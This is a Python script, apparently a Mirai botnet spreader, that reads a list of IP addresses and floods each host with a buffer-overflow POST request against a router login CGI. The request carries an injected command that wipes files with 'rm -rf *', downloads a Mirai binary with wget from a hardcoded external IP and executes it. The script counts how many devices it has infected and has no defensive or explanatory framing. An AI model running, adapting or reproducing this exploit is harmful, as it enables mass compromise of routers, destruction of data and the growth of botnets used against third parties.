#!/usr/bin/python

#zonehax is big 0 day exploiter 10/10
import sys, socket, json, time, ssl, struct, os
from threading import Thread
if len(sys.argv) < 2:
	print "Usage: python "+sys.argv[0]+" <list>"
	sys.exit()
port = 8080
buf = 4096
pre_pl0 = 0x2ad0c000
pre_pl2 = pre_pl0 + 0x00115d40
pl2 = struct.pack(">i",pre_pl2)
pre_pl3 = pre_pl0 + 0x0003CC9C
pl3 =  struct.pack(">i",pre_pl3)

payload = "rm -rf *; wget http://23.130.192.132/33bi/mirai.mips; chmod 777 mirai.mips; ./mirai.mips exploit.dasan"
payload2 = "rm -rf *; wget http://23.130.192.132/33bi/mirai.mips; chmod 777 mirai.mips; ./mirai.mips exploit.dasan"
payload3 = "rm -rf *; wget http://23.130.192.132/33bi/mirai.mips; chmod 777 mirai.mips; ./mirai.mips exploit.dasan"
payload4 = "rm -rf *; wget http://23.130.192.132/33bi/mirai.mips; chmod 777 mirai.mips; ./mirai.mips exploit.dasan"
pre_data = "A"*(756 - 0x28) + pl3 + 'C'*(0x28-8) + pl2 + ';'*24 + payload
pre_data2 = "A"*(756 - 0x28) + pl3 + 'C'*(0x28-8) + pl2 + ';'*24 + payload2
pre_data3 = "A"*(756 - 0x28) + pl3 + 'C'*(0x28-8) + pl2 + ';'*24 + payload3
pre_data4 = "A"*(756 - 0x28) + pl3 + 'C'*(0x28-8) + pl2 + ';'*24 + payload4
post_data = "action="+pre_data+"&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"
post_data2 = "action="+pre_data2+"&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"
post_data3 = "action="+pre_data3+"&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"
post_data4 = "action="+pre_data4+"&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"
headers = "POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+str(len(post_data))+"\r\n\r\n"+str(post_data)
headers2 = "POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+str(len(post_data2))+"\r\n\r\n"+str(post_data2)
headers3 = "POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+str(len(post_data3))+"\r\n\r\n"+str(post_data3)
headers4 = "POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+str(len(post_data4))+"\r\n\r\n"+str(post_data4)
i = 0
ips = open(sys.argv[1]).readlines()

def dasan(host):
    global i
    host = host.strip("\n")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = ssl.wrap_socket(sock)
        s.connect((host, port))
        s.send(headers)
        s.send(headers2)
        s.send(headers3)
        resp = s.recv(buf).strip()
        if "200 OK" in resp:
            i += 1
        s.close()
    except:
        pass
		
def worker():
    for ip in ips:
        try:
            ip = ip.strip("\r\n")
            t = Thread(target=dasan, args=(ip,))
            t.start()
            time.sleep(0.01)
        except:
            pass
    time.sleep(30)
    sys.exit("Finished Scanning")
workerthrd = Thread(target=worker)
workerthrd.start()
print headers
while True:
    try:
        sent = i
        sys.stdout.write("\r\033[33mPayload Sent To \033[92m[\033[93m"+str(i)+"\033[92m]\033[33m Devices\033[0m")
        sys.stdout.flush()
        time.sleep(1)
    except KeyboardInterrupt:
        sys.exit("Exiting On User Input")
    except:
        pass